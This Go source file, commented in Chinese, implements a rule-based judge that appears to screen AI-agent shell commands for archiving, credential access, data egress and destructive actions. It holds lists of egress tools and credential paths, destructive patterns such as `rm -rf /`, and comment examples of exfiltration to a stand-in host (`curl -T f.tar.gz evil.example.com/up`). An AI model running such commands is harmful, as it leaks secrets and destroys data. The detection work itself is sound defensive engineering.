package judge

import (
	"context"
	"net/url"
	"strings"

	"gateway/pkg/types"
)

// Rules 确定性规则后端（契约 §12 后端矩阵 kind=rules）。
//
// 定位：**默认后端、零依赖、可进 CI 回归、永不缺席的安全网**。它的输出必须
// 完全可复现——同一条 ActionDescriptor 在任何机器、任何时间都得到同一结论，
// 且不依赖任何外部进程。这是它和模型后端的根本分工：
//
//	规则：封闭词表 + argv 结构 → 能用「列全」的方式覆盖的判据
//	模型：语义、混淆、长尾 → 列不全的地方
//
// 因此本文件刻意不做任何「语义猜测」。判不了就返回 unknown（交给人或链上下一个
// 后端），而不是给一个看起来合理的低 severity——后者会让「自信地错」变成常态。
type Rules struct {
	whitelist Whitelist
}

// NewRules 构造规则后端。白名单在此也查一遍：Evaluator 层的短路是为了省一次
// 调用，但直接使用 Rules（测试、/v1/judge 端点）时白名单不能失效。
func NewRules(wl Whitelist) *Rules { return &Rules{whitelist: wl} }

// Name 后端名。进 Evidence.Engine 与指标标签。
func (r *Rules) Name() string { return "rules" }

// Capabilities 规则后端的自述。
//
// SchemaModes 留空不是遗漏：约束解码是「让模型输出守规矩」的手段，规则后端
// 本来就只会产出闭集内的值，该字段对它没有意义（空值语义是 prompt_only，
// 但 HasSchemaMode 的消费者只有模型类后端）。
func (r *Rules) Capabilities() types.Capabilities {
	return types.Capabilities{
		Deterministic:   true,
		GivesConfidence: false, // 规则不打分：有就是有，没有就是没有
	}
}

// Health 规则后端恒可用（进程内、无外部依赖）。
func (r *Rules) Health(context.Context) error { return nil }

// 严重度分档。刻意只取三个值，避免落进 redact 档：
//
//	0.00 → allow    （无命中）
//	0.60 → review   （可疑但不确定，交人）
//	0.90 → block    （明确高危）
//	0.95 → block    （多信号叠加：打包 + 外发 / 打包 + 凭证）
//
// 「redact」这个动作对工具调用几乎没有意义（要抹掉命令里的哪一段？），
// 所以规则后端不下探到 0.30–0.54 区间，让裁决只落在 allow/review/block 上。
const (
	sevArchiveNarrow = 0.60
	sevArchiveWhole  = 0.90
	sevCredential    = 0.90
	sevBulkRead      = 0.60
	sevEgress        = 0.60
	sevDestructive   = 0.90
	sevCombined      = 0.95
)

// archiveTools 打包 / 归档工具（argv 首词精确匹配）。
//
// 判据是「产出一个归档文件」这个动作本身，不管内容是不是仓库——是否整仓由
// packsWholeRepo 单独判。两者组合后才升到 block 档。
var archiveTools = map[string]bool{
	"tar": true, "gtar": true, "bsdtar": true,
	"zip": true, "7z": true, "7za": true, "7zr": true, "rar": true,
	"gzip": true, "pigz": true, "bzip2": true, "pbzip2": true,
	"xz": true, "pxz": true, "zstd": true, "zpaq": true,
	"cpio": true, "shar": true, "makeself": true,
	"compress-archive": true, // PowerShell
}

// egressTools 可能把数据发出本机的工具。
var egressTools = map[string]bool{
	"curl": true, "wget": true, "nc": true, "ncat": true, "netcat": true,
	"socat": true, "scp": true, "sftp": true, "rsync": true, "ssh": true,
	"ftp": true, "lftp": true, "tftp": true, "telnet": true,
	"rclone": true, "gsutil": true, "aws": true, "az": true, "gcloud": true,
	"huggingface-cli": true, "hf": true, "ngrok": true, "cloudflared": true,
}

// directionSensitiveTools 方向取决于旗标的网络工具。
//
// 只有这两个需要看旗标：它们的绝大多数调用是「从网络取回」（拉依赖、取数据、
// 探活），而取回不是外发。其余外发工具（scp / ssh / rsync / nc / rclone…）
// 以传输为唯一目的，调用默认按外发处理，不看旗标。
var directionSensitiveTools = map[string]bool{"curl": true, "wget": true}

// strongEgressTools 调用本身即意味着「往外送数据」的工具。
//
// 不含 curl/wget（方向看旗标），也不含 aws/az/gcloud/gsutil（多用途 CLI，
// 可能是纯本地操作，靠 isUploadSubcommand 认子命令）。
var strongEgressTools = map[string]bool{
	"scp": true, "sftp": true, "rsync": true, "ssh": true,
	"nc": true, "ncat": true, "netcat": true, "socat": true,
	"ftp": true, "lftp": true, "tftp": true, "telnet": true,
	"rclone": true, "ngrok": true, "cloudflared": true,
	"huggingface-cli": true, "hf": true,
}

// outboundLongFlags curl / wget 里表示「携带自有数据出站」的长旗标。
// 前缀匹配，同时覆盖 `--data=x` 与 `--data x` 两种写法。
var outboundLongFlags = []string{
	"--upload-file",                                             // curl -T
	"--data", "--data-raw", "--data-binary", "--data-urlencode", // 请求正文
	"--form", "--form-string", "--json", // 表单 / JSON 正文
	"--post-data", "--post-file", "--body-data", "--body-file", // wget
}

// curlOutboundShortFlags curl 里表示「携带自有数据出站」的单字符旗标。
//
// 按字符扫而不是按整词比：短旗标会连写（`curl -sT file URL` 里的 T 藏在
// `-sT` 中）。**大小写敏感**，理由见 hasOutboundDataFlag。
// wget 不适用——它的 `-t`（重试次数）与 `-T`（超时）都不是上传，且 wget 的
// 上传旗标只有长形式。
const curlOutboundShortFlags = "TdF"

// isFetchOnly 判定整条命令是否**只从网络取回、不携带自有数据送出**。
//
// 为什么值得单独判：curl / wget 是 agent 工作流里最常见的网络动作，其中下载
// （拉依赖、取数据、探活）占绝大多数。把它们一律算成 network_egress，会让
// 「外发」这个信号被无用告警淹没——而一个总在喊狼来了的判断层会被用户直接
// 关掉，那比漏报更彻底地失效（见 probe.go 对塌缩的说明）。
//
// 判据是「明确是取回」而不是「可能是取回」：只要出现任何可能携带正文的旗标、
// 任何 shell 替换（数据可以藏在 URL 里：`curl "https://x/?d=$(cat .env)"`），
// 或命令里还有别的非方向敏感外发工具（scp 等），就退回按外发处理。
// 方向不确定时一律从严——这一侧落在 fail-safe 上。
func isFetchOnly(cmds [][]string, text string) bool {
	// URL 的查询串静态看不到内容，有替换就无法断言「没带数据出去」。
	if strings.Contains(text, "$(") || strings.Contains(text, "${") || strings.Contains(text, "`") {
		return false
	}
	found := false
	for _, argv := range cmds {
		if len(argv) == 0 {
			continue
		}
		head := strings.ToLower(argv[0])
		if !egressTools[head] {
			continue
		}
		if !directionSensitiveTools[head] {
			// 命令里还有 scp / rsync / nc 之类：整条不是「只取回」。
			return false
		}
		if hasOutboundDataFlag(head, argv[1:]) {
			return false
		}
		found = true
	}
	return found
}

// hasOutboundDataFlag 参数里是否有「携带自有数据出站」的旗标。
//
// 长旗标不区分大小写（`--DATA` 与 `--data` 等价），短旗标**必须区分**——
// curl 的短旗标有区分度，不能先 ToLower：`-T` 上传 vs `-t` telnet-option、
// `-F` form vs `-f` fail、`-d` data vs `-D` dump-header。
func hasOutboundDataFlag(tool string, args []string) bool {
	for i := 0; i < len(args); i++ {
		raw := args[i]
		lower := strings.ToLower(raw)
		switch {
		case !strings.HasPrefix(raw, "-"):
			// 位置参数（URL / 文件名），跳过。
		case strings.HasPrefix(raw, "--"):
			for _, f := range outboundLongFlags {
				if lower == f || strings.HasPrefix(lower, f+"=") {
					return true
				}
			}
			// -X / --request 指定了会带正文的方法。
			if lower == "--request" && i+1 < len(args) && methodCarriesBody(args[i+1]) {
				return true
			}
			if strings.HasPrefix(lower, "--request=") && methodCarriesBody(lower[len("--request="):]) {
				return true
			}
		default:
			if tool != "curl" {
				continue
			}
			body := raw[1:]
			if strings.ContainsAny(body, curlOutboundShortFlags) {
				return true
			}
			// 连写形态 `-XPOST`，或 `-X POST <url>`。小写 'x' 是代理，不认。
			if i := strings.IndexByte(body, 'X'); i >= 0 {
				m := body[i+1:]
				if m == "" && i+1 < len(args) {
					m = args[i+1]
				}
				if methodCarriesBody(m) {
					return true
				}
			}
		}
	}
	return false
}

// methodCarriesBody HTTP 方法是否通常会带请求正文。
// 保守只认这三个：DELETE 等方法带正文罕见，认它只会凭空造出误报。
func methodCarriesBody(m string) bool {
	switch strings.ToUpper(strings.TrimSpace(m)) {
	case "POST", "PUT", "PATCH":
		return true
	}
	return false
}

// knowsSendsTargetInvisible 是否「确定在往外送数据，但读不出目标」。
//
// 三种来源，每一种都足以断定「有数据在往外走」：
//
//  1. curl / wget 带了正文旗标（`-T` / `-d` / `-F` / `--post-file` …）；
//  2. 以传输为目的的工具带了操作数（`ssh host` / `nc host 4444` / `rsync … host:/d`）——
//     extractHost 认不出不带 scheme 也不带 `user@` 的写法；
//  3. 命令里有 shell 替换，且存在带操作数的取回式调用 —— 数据可以藏在 URL 里
//     （`curl "$(cat url.txt)"`）。
//
// 第 3 条要求「带操作数」是为了不误伤 `curl --version && echo \`date\“：
// 那条命令里没有 URL，替换结果不可能被送出去。
//
// 判 unknown（→ review）而不是 benign：读不出目标是「**看不见**」，不是「没有」。
// 漏报比误报危险，这一侧必须从严。同 indirectDanger 的既有处理。
func knowsSendsTargetInvisible(cmds [][]string, text string) bool {
	if hasOutboundDataFlagInAny(cmds) {
		return true
	}
	if strings.Contains(text, "$(") || strings.Contains(text, "${") || strings.Contains(text, "`") {
		if anyDirectionSensitiveWithOperand(cmds) {
			return true
		}
	}
	return anyStrongEgressWithOperand(cmds)
}

// hasOutboundDataFlagInAny 命令序列里是否有「携带正文出站」的旗标。
func hasOutboundDataFlagInAny(cmds [][]string) bool {
	for _, argv := range cmds {
		if len(argv) < 2 {
			continue
		}
		head := strings.ToLower(argv[0])
		if directionSensitiveTools[head] && hasOutboundDataFlag(head, argv[1:]) {
			return true
		}
	}
	return false
}

// anyDirectionSensitiveWithOperand curl / wget 是否带了非旗标参数（URL）。
func anyDirectionSensitiveWithOperand(cmds [][]string) bool {
	for _, argv := range cmds {
		if len(argv) < 2 || !directionSensitiveTools[strings.ToLower(argv[0])] {
			continue
		}
		for _, a := range argv[1:] {
			if !strings.HasPrefix(a, "-") {
				return true
			}
		}
	}
	return false
}

// anyStrongEgressWithOperand 是否出现「以传输为目的的外发工具，且带了操作数」。
//
// 过滤 `ssh -V` 这类形态：调用了工具但没有操作数，不产生网络事务，
// 不该因为工具名进词表就被判 unknown。
func anyStrongEgressWithOperand(cmds [][]string) bool {
	for _, argv := range cmds {
		if len(argv) < 2 || !strongEgressTools[strings.ToLower(argv[0])] {
			continue
		}
		for _, a := range argv[1:] {
			if !strings.HasPrefix(a, "-") {
				return true
			}
		}
	}
	return false
}

// destructiveTools 破坏性工具（argv 首词）。
var destructiveTools = map[string]bool{
	"rm": true, "shred": true, "dd": true, "truncate": true, "wipefs": true,
	"mkfs": true, "mkfs.ext4": true, "mkfs.xfs": true, "mkfs.btrfs": true,
	"fdisk": true, "parted": true,
}

// recursiveScanTools 递归遍历工具（需配合递归参数才判 bulk_read）。
var recursiveScanTools = map[string]bool{
	"find": true, "rg": true, "ag": true, "ack": true, "grep": true, "tree": true,
}

// credentialMarkers 凭证 / 密钥类路径片段（小写子串匹配）。
//
// 子串而非精确路径：`.ssh` 出现在 `cat ~/.ssh/id_rsa`、`rsync .ssh/ x`、
// `--exclude-from=.ssh/config` 里都是同一件事的线索，用路径解析反而会漏。
var credentialMarkers = []string{
	".ssh", "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
	".aws/credentials", ".aws/config",
	".gnupg", ".netrc", ".npmrc", ".pypirc", ".pgpass", ".my.cnf",
	".docker/config.json", ".kube/config", ".git-credentials",
	".config/gcloud", ".bash_history", ".zsh_history",
	"credentials.json", "service-account.json", "serviceaccount.json",
	".env", "secrets.yaml", "secrets.yml",
	"/etc/shadow",
}

// Judge 对一条描述给出证据。
func (r *Rules) Judge(_ context.Context, d types.ActionDescriptor) (types.Evidence, error) {
	if err := d.Validate(); err != nil {
		return types.Evidence{}, err
	}
	benign := types.Evidence{Category: types.CatBenign, Engine: r.Name(), Severity: 0}

	if label, ok := r.whitelist.Hit(d); ok {
		benign.Reasons = []string{"whitelist hit " + label}
		return benign, nil
	}

	cmds := ExpandedCommands(d.CommandLine())
	// 只有 Target 没有命令文本的场合（如 MCP 门面只给了路径）也应当能判：
	// 把 Target 当作一条单元素命令补进去。
	if len(cmds) == 0 && d.Target != "" {
		cmds = [][]string{{d.Target}}
	}

	hits := r.assess(d, cmds)
	if len(hits) == 0 {
		return benign, nil
	}
	return bestEvidence(hits), nil
}

// assess 收集所有命中的证据（不提前返回：需要看到全部命中才能做组合升级）。
func (r *Rules) assess(d types.ActionDescriptor, cmds [][]string) []types.Evidence {
	var hits []types.Evidence
	text := strings.ToLower(d.CommandLine())

	add := func(cat types.ActionCategory, sev float64, reason string) {
		hits = append(hits, types.Evidence{Category: cat, Engine: r.Name(), Severity: sev, Reasons: []string{reason}})
	}

	// —— 打包归档 ——
	if bin := firstArchiveTool(cmds); bin != "" {
		if packsWholeRepo(cmds) {
			add(types.CatArchive, sevArchiveWhole, "打包归档且目标是仓库根/当前目录/家目录："+bin)
		} else {
			add(types.CatArchive, sevArchiveNarrow, "打包归档："+bin)
		}
	} else if isGitArchive(cmds) {
		add(types.CatArchive, sevArchiveNarrow, "git archive 产出归档")
	} else if ind := indirectDanger(text, cmds); ind != "" {
		// 高危工具名出现在命令里，但首词对不上——典型是 `timeout 5 tar ...`
		// 或 `t=tar; $t -czf .` 这类间接引用。规则只能看到字面量，
		// 这里返回 unknown（交给人 / 链上下一个后端），而不是猜一个档位。
		add(types.CatUnknown, 0, "高危工具名出现但首词对不上（疑似包装或间接引用）："+ind)
	}

	// —— 凭证路径 ——
	if m := matchMarker(text, credentialMarkers); m != "" {
		add(types.CatCredential, sevCredential, "触及凭证/密钥路径："+m)
	}

	// —— 批量读取 / 仓库遍历 ——
	if reason := bulkReadReason(d, cmds, text); reason != "" {
		add(types.CatBulkRead, sevBulkRead, reason)
	}

	// —— 外发 ——
	if bin := firstTool(cmds, egressTools); bin != "" {
		host := extractHost(cmds)
		switch {
		case host != "" && r.hostWhitelisted(host):
			// 用户显式声明的可信目标：与工具白名单同理，不打点也不需要理由。
		case host != "" && isFetchOnly(cmds, text):
			// 明确是「取回」而非「送出」：不计外发。
			//
			// 仍然记一条 benign 证据把判据留在报告里——「为什么什么都没报」
			// 与「报了什么」同样需要可解释，否则用户只能看到一片沉默。
			add(types.CatBenign, 0, "只从网络取回，未携带自有数据出站："+bin)
		case host != "":
			add(types.CatEgress, sevEgress, "出站到非白名单 host："+host)
		case isUploadSubcommand(cmds):
			add(types.CatEgress, sevEgress, "上传类子命令（目标 host 不可见）："+bin)
		case knowsSendsTargetInvisible(cmds, text):
			// 确定在往外送数据（带了正文旗标 / 传输型工具带了操作数），
			// 但 extractHost 读不出目标。
			//
			// 这一条覆盖了一个真实的漏报形状：`curl -T f.tar.gz evil.example.com/up`
			// ——没有 scheme 的 URL，extractHost 认不出来，而 curl 又不在
			// strongEgressTools 里（它的方向要看旗标），修之前会整条落 benign。
			//
			// 判 unknown 交 review：读不出目标是「看不见」，不是「没有」。
			add(types.CatUnknown, 0, "确定在往外送数据，但目标 host 不可见："+bin)
		}
	} else if isUploadSubcommand(cmds) {
		// 工具本身不在外发表里，但子命令明确是推送（git push / npm publish /
		// docker push ...）。目标 host 通常不可见，但它一定是往外送数据。
		add(types.CatEgress, sevEgress, "推送类子命令（git push / publish / push）")
	}

	// —— 破坏性 ——
	if isDestructive(cmds) {
		add(types.CatDestructive, sevDestructive, "破坏性命令形态")
	}

	// —— 组合升级：单个动作都还在 review 档，组合起来才是外泄链路 ——
	cats := map[types.ActionCategory]bool{}
	for _, h := range hits {
		cats[h.Category] = true
	}
	switch {
	case cats[types.CatArchive] && cats[types.CatEgress]:
		add(types.CatExfil, sevCombined, "同一条命令里既打包又外发")
	case cats[types.CatArchive] && cats[types.CatCredential]:
		add(types.CatExfil, sevCombined, "同一条命令里既打包又触及凭证")
	}

	return hits
}

// bestEvidence 取 severity 最高的证据；并列时保留先加入的（顺序即优先级）。
func bestEvidence(hits []types.Evidence) types.Evidence {
	best := hits[0]
	for _, h := range hits[1:] {
		if h.Severity > best.Severity {
			best = h
		}
	}
	return best
}

// firstTool 返回命令序列里首个命中词表的工具名。
func firstTool(cmds [][]string, table map[string]bool) string {
	for _, argv := range cmds {
		if len(argv) == 0 {
			continue
		}
		if table[strings.ToLower(argv[0])] {
			return argv[0]
		}
	}
	return ""
}

// lookupTool 在任意文本里找词表中的工具名，跳过 excludes 里已作为首词出现过的。
//
// 用于赋值右侧这类「不是 argv 首词」的位置——`t=tar; $t -czf .` 里 tar 只出现
// 在赋值中，规则需要把它捞出来看。
func lookupTool(text string, table map[string]bool, excludes map[string]bool) string {
	for _, field := range strings.FieldsFunc(text, func(r rune) bool {
		return r == ' ' || r == ';' || r == '=' || r == '"' || r == '\'' || r == '\n' || r == '\t'
	}) {
		w := strings.ToLower(field)
		if table[w] && !excludes[w] {
			return field
		}
	}
	return ""
}

// indirectDanger 找出「命令里出现、但没被当作首词执行」的高危工具名。
//
// 这个信号的价值在于**诚实**：它说明规则看到了危险字面量却无法确定动作，
// 因此返回 unknown（→ review）而不是按「没命中」放行。
func indirectDanger(text string, cmds [][]string) string {
	heads := make(map[string]bool, len(cmds))
	for _, argv := range cmds {
		if len(argv) > 0 {
			heads[strings.ToLower(argv[0])] = true
		}
	}
	probe := text + " " + strings.ToLower(strings.Join(Assignments(cmds), " "))
	for _, table := range []map[string]bool{archiveTools, egressTools, destructiveTools} {
		if name := lookupTool(probe, table, heads); name != "" {
			return name
		}
	}
	return ""
}

// isGitArchive `git archive` 是打包动作，但首词是 git，需要单独判。
func isGitArchive(cmds [][]string) bool {
	for _, argv := range cmds {
		if len(argv) >= 2 && strings.EqualFold(argv[0], "git") && strings.EqualFold(argv[1], "archive") {
			return true
		}
	}
	return false
}

// packsWholeRepo 打包目标是否覆盖仓库根 / 当前目录 / 家目录 / 整个文件系统。
//
// 判据只看「目标参数」这一处，不看工具类型——`tar -czf x .`、`zip -r x .`、
// `7z a x .` 的目标都是 `.`，这是同一个事实的三种写法。
func packsWholeRepo(cmds [][]string) bool {
	for _, argv := range cmds {
		if !isArchiveInvocation(argv) {
			continue
		}
		for _, a := range argv[1:] {
			if strings.HasPrefix(a, "-") && !strings.Contains(a, "/") {
				continue
			}
			switch strings.TrimRight(a, "/") {
			case "", ".", "..", "~", "*", "$pwd", "${pwd}":
				return true
			}
			if a == "/" || strings.HasPrefix(a, "~/") {
				return true
			}
		}
	}
	return false
}

// isArchiveInvocation 该 argv 是否是一次「产出归档」的调用（含 git archive）。
//
// 关键是要把 `-x`（解包）/ `-t`（列出）排掉：`tar -xzf backup.tar.gz` 与
// `tar -czf repo.tar.gz .` 首词相同、方向相反。只看首词会把「解压一个包」
// 判成「打包整个仓库」，这是最典型的假阳性来源。
func isArchiveInvocation(argv []string) bool {
	if len(argv) == 0 {
		return false
	}
	head := strings.ToLower(argv[0])
	if head == "git" {
		return len(argv) >= 2 && strings.EqualFold(argv[1], "archive")
	}
	if head == "" || !archiveTools[head] {
		return false
	}
	// 7z / rar 用位置参数表示子命令：a/u=添加，x/e=解包，l/t=列出。
	if len(argv) >= 2 {
		switch head {
		case "7z", "7za", "7zr", "rar":
			switch strings.ToLower(argv[1]) {
			case "x", "e", "l", "t":
				return false
			}
		}
	}
	for _, a := range argv[1:] {
		la := strings.ToLower(a)
		if strings.HasPrefix(la, "--extract") || strings.HasPrefix(la, "--list") ||
			strings.HasPrefix(la, "--to-stdout") || strings.HasPrefix(la, "--get") {
			return false
		}
		if strings.HasPrefix(la, "-") && !strings.HasPrefix(la, "--") {
			flags := la[1:]
			if strings.ContainsAny(flags, "xt") && !strings.ContainsAny(flags, "c") {
				return false
			}
		}
	}
	return true
}

// firstArchiveTool 返回首个「确为产出归档」的工具名。
func firstArchiveTool(cmds [][]string) string {
	for _, argv := range cmds {
		if isArchiveInvocation(argv) && !strings.EqualFold(argv[0], "git") {
			return argv[0]
		}
	}
	return ""
}

// bulkReadReason 给出批量读取的判据说明；无命中返回空串。
func bulkReadReason(d types.ActionDescriptor, cmds [][]string, text string) string {
	if marker := gitDirMarker(text); marker != "" {
		return "读取仓库元数据目录：" + marker
	}
	for _, argv := range cmds {
		if len(argv) == 0 {
			continue
		}
		tool := strings.ToLower(argv[0])
		if !recursiveScanTools[tool] {
			continue
		}
		// find 默认就是递归的；只有显式限深时才不算遍历。
		if tool == "find" {
			if !hasMaxDepth(argv) {
				return "递归遍历文件树：find"
			}
			continue
		}
		for _, a := range argv[1:] {
			la := strings.ToLower(a)
			if !strings.HasPrefix(la, "-") {
				continue
			}
			if la == "-r" || la == "-rn" || la == "-nr" || strings.HasPrefix(la, "-r") ||
				strings.HasPrefix(la, "--recursive") || la == "-g" || la == "--files" {
				return "递归遍历文件树：" + argv[0]
			}
		}
	}
	// 批量读取的显式信号由采集侧填（如「本回合读了 120 个文件」）。
	if d.Meta != nil {
		if n := d.Meta["file_count"]; n != "" {
			return "单次动作涉及文件数：" + n
		}
	}
	return ""
}

// hasMaxDepth 是否显式限制了遍历深度（`find . -maxdepth 1` 只列当前层）。
func hasMaxDepth(argv []string) bool {
	for _, a := range argv {
		la := strings.ToLower(a)
		if la == "-maxdepth" || la == "--max-depth" || la == "-depth" {
			return true
		}
	}
	return false
}

// gitDirMarker 在文本里找 `.git` 作为独立路径片段出现的位置。
func gitDirMarker(text string) string {
	const needle = ".git"
	for from := 0; ; {
		i := strings.Index(text[from:], needle)
		if i < 0 {
			return ""
		}
		i += from
		after := i + len(needle)
		if after >= len(text) || strings.ContainsRune("/\\\"' *;|&", rune(text[after])) {
			return ".git"
		}
		from = after
	}
}

// extractHost 从命令里提取目标 host。
func extractHost(cmds [][]string) string {
	for _, argv := range cmds {
		for _, a := range argv[1:] {
			if strings.HasPrefix(a, "-") {
				continue
			}
			if u, err := url.Parse(a); err == nil && u.Host != "" && (u.Scheme == "http" || u.Scheme == "https" || u.Scheme == "ftp") {
				return u.Hostname()
			}
			// scp / rsync / ssh 的 [user@]host:path 形态
			if at := strings.LastIndexByte(a, '@'); at >= 0 {
				rest := a[at+1:]
				if i := strings.IndexByte(rest, ':'); i > 0 {
					return rest[:i]
				}
			}
		}
	}
	return ""
}

// isUploadSubcommand 是否属于「明显在上传/推送」的子命令（目标 host 不可见的场景）。
func isUploadSubcommand(cmds [][]string) bool {
	for _, argv := range cmds {
		if len(argv) < 2 {
			continue
		}
		head, sub := strings.ToLower(argv[0]), strings.ToLower(argv[1])
		switch head {
		case "git":
			if sub == "push" {
				return true
			}
		case "aws":
			if sub == "s3" && len(argv) >= 3 {
				s := strings.ToLower(argv[2])
				if s == "cp" || s == "sync" || s == "mv" {
					return true
				}
			}
		case "docker", "podman":
			if sub == "push" {
				return true
			}
		case "npm", "pnpm", "yarn":
			if sub == "publish" {
				return true
			}
		case "gsutil":
			if sub == "cp" || sub == "rsync" {
				return true
			}
		case "huggingface-cli":
			if sub == "upload" {
				return true
			}
		}
	}
	return false
}

// isDestructive 是否构成破坏性动作。
//
// 单看工具名不够（`rm tmp.txt` 与 `rm -rf /` 都是 rm），所以带上参数形态。
func isDestructive(cmds [][]string) bool {
	for _, argv := range cmds {
		if len(argv) == 0 {
			continue
		}
		head := strings.ToLower(argv[0])
		if !destructiveTools[head] {
			continue
		}
		for _, a := range argv[1:] {
			la := strings.ToLower(a)
			switch {
			case la == "-r" || la == "-rf" || la == "-fr" || la == "-rF",
				la == "--recursive", la == "--force", la == "-f",
				strings.HasPrefix(la, "--recursive"):
				return true
			case head == "dd" && strings.HasPrefix(la, "of=/dev/"):
				return true
			case (head == "rm" || head == "shred") && (a == "/" || a == "/*" || a == "*" || strings.HasPrefix(a, "~")):
				return true
			}
		}
		// git reset --hard / git clean -fdx 属于破坏性，但首词是 git。
	}
	for _, argv := range cmds {
		if len(argv) >= 3 && strings.EqualFold(argv[0], "git") {
			switch strings.ToLower(argv[1]) {
			case "reset":
				if strings.EqualFold(argv[2], "--hard") {
					return true
				}
			case "clean":
				for _, a := range argv[2:] {
					if strings.HasPrefix(a, "-") && strings.ContainsAny(a, "fdx") {
						return true
					}
				}
			}
		}
	}
	return false
}

// matchMarker 返回文本里命中的第一个标记（小写比较）。
func matchMarker(text string, markers []string) string {
	for _, m := range markers {
		if m == "" {
			continue
		}
		if strings.Contains(text, m) {
			return m
		}
	}
	return ""
}

// hostWhitelisted 目标 host 是否在规则后端自己的白名单里。
func (r *Rules) hostWhitelisted(host string) bool {
	for _, h := range r.whitelist.Hosts {
		if matchHost(host, h) {
			return true
		}
	}
	return false
}
